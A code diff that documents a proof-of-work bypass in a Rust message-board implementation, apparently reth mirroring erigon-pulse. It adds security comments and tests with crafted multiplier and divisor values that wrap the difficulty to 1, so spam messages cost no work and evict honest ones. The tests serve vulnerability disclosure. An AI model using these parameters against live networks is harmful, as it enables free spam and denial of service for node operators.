@@ -116,12 +116,20 @@ impl PoWMsg {
     ///
     /// Uses `wrapping_mul` to mirror erigon-pulse's plain `uint64` arithmetic
     /// (`pow_message.go`: `(1<<24 + pm.Size()*10_000) * multiplier / divisor`).
-    /// An attacker that picks `multiplier × base > 2^64` would otherwise see
-    /// reth saturate to `u64::MAX` (rejecting) while erigon silently wraps
-    /// (accepting) — and any divergence in the verification function is a wire
-    /// gap. Caller-side bounds (`is_work_acceptable`, validate) keep honest
-    /// inputs far from the wrap regime; `validate` also rejects
-    /// `work_divisor == 0` before this function is reachable.
+    /// Saturating instead would make reth reject messages erigon accepts, and
+    /// any divergence in the verification function is a wire gap. `validate`
+    /// rejects `work_divisor == 0` before this function is reachable.
+    ///
+    /// # Security
+    ///
+    /// **The wrap is exploitable, in both clients** — see
+    /// `docs/msgboard-parity-gaps.md` §14.1. `multiplier` is attacker-chosen,
+    /// so the product can be wrapped onto any residue, including one that makes
+    /// this return 1. Every hash is divisible by 1, so the `PoW` becomes free
+    /// while the message still clears `is_work_acceptable` — the minimum-work
+    /// gate constrains the declared *ratio*, which the wrap decouples from the
+    /// difficulty actually enforced. Matching erigon is why the wrap is kept;
+    /// fixing it is a coordinated wire change, not a unilateral one.
     pub fn difficulty(&self) -> u64 {
         let base: u64 = (1u64 << 24).wrapping_add(self.size().wrapping_mul(10_000));
         base.wrapping_mul(self.work_multiplier).wrapping_div(self.work_divisor)
@@ -755,5 +763,81 @@ mod tests {
 
         // Sanity-check the version byte.
         assert_eq!(msg.msg.version, VERSION_V1);
+    }
+}
+
+#[cfg(test)]
+mod difficulty_overflow_vuln {
+    use super::*;
+    use crate::MsgboardConfig;
+    use alloy_primitives::keccak256;
+
+    /// `work_multiplier`/`work_divisor` that drive [`PoWMsg::difficulty`] to 1
+    /// for a 1-byte message, found by solving
+    /// `base * multiplier ≡ 2^v2(base) (mod 2^64)`.
+    const EVIL_MULTIPLIER: u64 = 1_014_806_211_241_672_337;
+    const EVIL_DIVISOR: u64 = 16;
+
+    fn evil_msg(nonce: u64) -> PoWMsg {
+        let mut b = [0u8; 32];
+        b[0] = 0x01;
+        PoWMsg {
+            version: VERSION_V1,
+            block_hash: B256::from(b),
+            nonce,
+            work_multiplier: EVIL_MULTIPLIER,
+            work_divisor: EVIL_DIVISOR,
+            category: keccak256(b"spam"),
+            data: Bytes::copy_from_slice(&[0u8]),
+        }
+    }
+
+    /// Documents a live vulnerability shared with erigon-pulse — **this test
+    /// asserts the broken behaviour**, so it will fail the day it is fixed.
+    /// See `docs/msgboard-parity-gaps.md` §14.1.
+    ///
+    /// `difficulty()` is `(2^24 + size*10_000) * multiplier / divisor` in
+    /// wrapping u64 arithmetic, matching erigon's plain `uint64` expression.
+    /// The multiplier is attacker-chosen, so the product can be wrapped onto
+    /// any residue: here onto exactly `divisor`, making `difficulty == 1`.
+    /// The `PoW` check is `hash % difficulty == 0`, and every hash is
+    /// divisible by 1, so **any nonce is accepted and the message costs zero
+    /// work**. Only `difficulty == 0` is rejected, which does not help — 1 is
+    /// as free as 0 and passes the guard.
+    #[test]
+    fn difficulty_overflow_makes_pow_free_for_any_nonce() {
+        assert_eq!(evil_msg(1).difficulty(), 1, "crafted params must wrap difficulty to 1");
+
+        // An honest message of the same size pays ~168k.
+        let honest = PoWMsg { work_multiplier: 10_000, work_divisor: 1_000_000, ..evil_msg(1) };
+        assert_eq!(honest.difficulty(), 167_872);
+
+        // Every nonce is a valid solution — no search, no work.
+        for nonce in 1..=64u64 {
+            assert!(
+                evil_msg(nonce).to_checked(100, 0).is_ok(),
+                "nonce {nonce} should be accepted with difficulty 1",
+            );
+        }
+    }
+
+    /// The crafted message also passes the minimum-work gate, and does so with
+    /// an enormous declared ratio — so it is not merely free, it outranks every
+    /// honest message.
+    ///
+    /// Board precedence is `(block, difficulty_ratio)` ascending and eviction
+    /// pops `msgs[0]`, so a higher ratio means the spam survives and honest
+    /// messages are evicted first.
+    #[test]
+    fn the_free_message_also_outranks_every_honest_one() {
+        let cfg = MsgboardConfig::default();
+        assert!(
+            cfg.is_work_acceptable(EVIL_MULTIPLIER, EVIL_DIVISOR),
+            "crafted params clear the minimum-work gate",
+        );
+
+        let evil = evil_msg(1).difficulty_ratio();
+        let honest = cfg.work_multiplier as f64 / cfg.work_divisor as f64;
+        assert!(evil > honest * 1e18, "declared ratio {evil} dwarfs the honest {honest}");
     }
 }
